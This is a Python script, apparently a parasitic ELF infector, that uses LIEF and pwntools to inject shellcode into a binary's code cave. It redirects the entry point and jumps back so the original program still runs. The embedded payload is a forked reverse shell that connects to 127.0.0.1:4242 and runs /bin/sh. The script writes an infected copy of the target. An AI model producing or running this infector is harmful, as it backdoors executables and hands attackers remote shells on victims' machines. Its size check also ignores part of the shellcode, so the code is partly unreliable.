#!/usr/bin/env python3
from pwn import *
#from os import sysconf
import sys
import struct
import lief
from textwrap import dedent
if len(sys.argv) != 2:
    print('Usage: viscr.py <binary>')
    exit(1)


e = lief.ELF.parse(sys.argv[1])
og_entry = e.header.entrypoint
#page_size = sysconf("SC_PAGE_SIZE")

'''
1. find executable segment
2. calculate cave size and cave offset from p_filesz (segment size)
3. increase headers sizes and offsets for parasite code to be accounted

TESTING SEGMENT

seg = e.segments
for i in range(len(seg)):
    if (seg[i].type == lief.ELF.SEGMENT_TYPES.LOAD) and (seg[i].flags.value == 5):
        vaddr = seg[i].virtual_address
        og_text_filesz = seg[i].physical_size
        text_end = seg[i].file_offset + og_text_filesz
        cave_off = seg[i].virtual_address + og_text_filesz  
        cavesz = (seg[i].virtual_address + seg[i].alignment) - cave_off
        seg[i].virtual_size += len(payload) + 5
        seg[i].physical_size += len(payload) + 5

        #for j in range(i + 1, len(seg)):
        #        if (seg[j].file_offset > text_end):
        #            seg[j].file_offset += page_size
        break

sec = e.sections
for i in e.sections:
    sh_addr = i.file_offset + vaddr
    print("{} - {}".format(i.type, sh_addr))
    if (sh_addr > cave_off):
        i.file_offset += page_size
    #elif ((sh_addr + i.original_size) == cave_off):
    else:
        i.original_size += len(payload) + 5
'''

'''
1. find executable segment
2. calculate cave size and cave offset from p_filesz (segment size)
3. increase headers sizes and offsets for parasite code to be accounted
'''
for seg in e.segments:
    if (seg.type == lief.ELF.SEGMENT_TYPES.LOAD) and (seg.flags.value == 5):
        cave_off = seg.virtual_address + seg.physical_size 
        cavesz = abs((seg.virtual_address + seg.alignment) - cave_off)
        #seg.virtual_size += len(payload) + 5
        #seg.physical_size += len(payload) + 5
        break

#generate shellcode
#payload = b"\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6"

payload = b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x10\x92\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

"""
	    xor rax, rax
	    xor rdi, rdi
	    xor rdx, rdx
	    xor rsi, rsi
"""
context.arch = 'amd64'
sc = asm(shellcraft.fork())
sc += asm(dedent(f"""\
        cmp rax, 0
        je child
	    xor rax, rax
	    xor rdi, rdi
	    xor rdx, rdx
	    xor rsi, rsi

        child:
    """))
sc += payload
print(disasm(sc))

if (len(payload) + 5) > cavesz:
    print("Cave is too small to place a payload")
    exit(1)

e.header.entrypoint =  cave_off
e.write("{}_infctd".format(sys.argv[1]))
elf = ELF('{}_infctd'.format(sys.argv[1]), False)

print("Arch === {}".format(elf.arch))
print("Endian === {}".format(elf.endian))
print("Found cave at {} ; size - {}".format(hex(cave_off), cavesz))

#patch
jmp_addr = (og_entry 
            - (cave_off + len(sc) + 5))
jmp_back = b"\xe9" + struct.pack('<i', jmp_addr) # relative jmp
sc += jmp_back

elf.mmap[cave_off:cave_off+len(sc)] = sc
elf.save('{}_infctd'.format(sys.argv[1]))
print('{}_infctd created. Use wisely'.format(sys.argv[1]))
